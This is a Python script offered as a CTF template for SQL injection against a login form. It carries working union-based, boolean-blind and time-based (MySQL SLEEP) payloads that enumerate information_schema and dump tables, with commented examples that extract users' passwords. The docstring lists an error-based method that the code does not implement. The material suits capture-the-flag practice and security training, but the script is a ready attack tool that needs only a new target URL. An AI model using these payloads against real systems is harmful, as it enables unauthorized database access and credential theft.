#!/usr/bin/env python3
"""
Web SQLi Data Extraction — CTF Template

Strategies:
  1. Union-based: extract DB name, tables, columns, data
  2. Error-based: trigger verbose SQL errors to leak data
  3. Blind boolean: binary search over data character by character
  4. Time-based blind: delay-based inference (when no output at all)

Uses: requests, manual payloads (no sqlmap dependency)
"""
import requests
import string
import time
from urllib.parse import quote

# ── configure ────────────────────────────────────────────────────────────────
TARGET_URL = "http://chall.ctf.io:8080/login"
VULNERABLE_PARAM = "username"           # GET or POST param that's injectable
METHOD = "POST"                         # "GET" or "POST"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
COOKIES = {}
# Success condition (adjust to your challenge)
SUCCESS_STRING = "Welcome"             # Response contains this on true condition
ERROR_STRING   = "error"               # Optional: error-based detection

# Union-based: adjust column count
UNION_COLS = 3          # try 1..10 until no error
UNION_TARGET_COL = 1    # which column to extract data from (1-indexed)
# ─────────────────────────────────────────────────────────────────────────────


def send(payload: str) -> requests.Response:
    """Send payload to target, return response."""
    data = {VULNERABLE_PARAM: payload, "password": "x"}
    if METHOD == "GET":
        return requests.get(TARGET_URL, params=data, headers=HEADERS, cookies=COOKIES, timeout=10)
    return requests.post(TARGET_URL, data=data, headers=HEADERS, cookies=COOKIES, timeout=10)


def is_true(payload: str) -> bool:
    r = send(payload)
    return SUCCESS_STRING.encode() in r.content


# ── Union-based extraction ───────────────────────────────────────────────────
def union_extract(query: str) -> str:
    """Extract single value via UNION SELECT."""
    nulls = ", ".join(["NULL"] * UNION_COLS)
    target_col_idx = UNION_TARGET_COL - 1
    cols = ["NULL"] * UNION_COLS
    cols[target_col_idx] = f"({query})"
    union_payload = f"' UNION SELECT {', '.join(cols)}-- -"
    r = send(union_payload)
    return r.text


def get_db_name():
    print("[*] Database name:", union_extract("database()"))

def get_tables():
    query = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
    print("[*] Tables:", union_extract(query))

def get_columns(table: str):
    query = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'"
    print("[*] Columns:", union_extract(query))

def dump_table(table: str, column: str):
    query = f"SELECT GROUP_CONCAT({column} SEPARATOR '|') FROM {table}"
    print(f"[*] {table}.{column}:", union_extract(query))


# ── Blind boolean extraction ─────────────────────────────────────────────────
CHARSET = string.printable

def blind_extract(query: str, max_len: int = 50) -> str:
    """Extract a string byte by byte using boolean blind SQLi."""
    result = ""
    for pos in range(1, max_len + 1):
        lo, hi = 32, 126
        found = False
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            if is_true(payload):
                lo = mid + 1
            else:
                hi = mid - 1
        if lo > 126:
            break  # end of string
        char = chr(lo)
        result += char
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result


# ── Time-based blind extraction ──────────────────────────────────────────────
def time_blind_extract(query: str, max_len: int = 50, delay: float = 2.0) -> str:
    """Extract string via time-based blind SQLi (MySQL SLEEP)."""
    result = ""
    for pos in range(1, max_len + 1):
        for char in CHARSET:
            payload = (
                f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1))={ord(char)},"
                f"SLEEP({delay}),0)-- -"
            )
            t0 = time.time()
            send(payload)
            elapsed = time.time() - t0
            if elapsed >= delay * 0.8:
                result += char
                print(f"\r[*] Extracting: {result}", end="", flush=True)
                break
        else:
            break
    print()
    return result


# ── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("[*] Testing connection...")
    r = send("test")
    print(f"    Status: {r.status_code}, Length: {len(r.content)}")

    print("\n[1] Trying union-based extraction...")
    get_db_name()
    get_tables()
    # Fill in table/column from above results:
    # get_columns("users")
    # dump_table("users", "password")

    # If union fails, try blind:
    # print("\n[2] Trying blind boolean extraction...")
    # result = blind_extract("SELECT password FROM users LIMIT 1")
    # print("[+] Blind extracted:", result)
